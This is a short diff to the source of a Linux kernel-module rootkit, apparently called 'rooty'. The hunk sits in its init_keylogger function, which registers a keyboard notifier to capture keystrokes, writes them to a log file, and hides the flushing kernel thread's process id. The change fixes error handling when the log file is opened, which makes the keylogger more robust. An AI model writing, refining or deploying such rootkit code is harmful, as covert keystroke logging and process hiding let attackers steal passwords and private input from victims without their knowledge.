@@ -213,8 +213,10 @@ void init_keylogger(void)
     register_keyboard_notifier(&nb);
 
     logfile = filp_open(LOG_FILE, O_WRONLY|O_APPEND|O_CREAT, S_IRWXU);
-    if ( ! logfile )
+    if ( IS_ERR(logfile) ) {
         printk("rooty: KEYLOGGER: Failed to open log file: %s", LOG_FILE);
+        logfile = NULL;
+    }
 
     log_ts = kthread_run(flusher, NULL, "kthread");
     hide_proc(log_ts->pid);
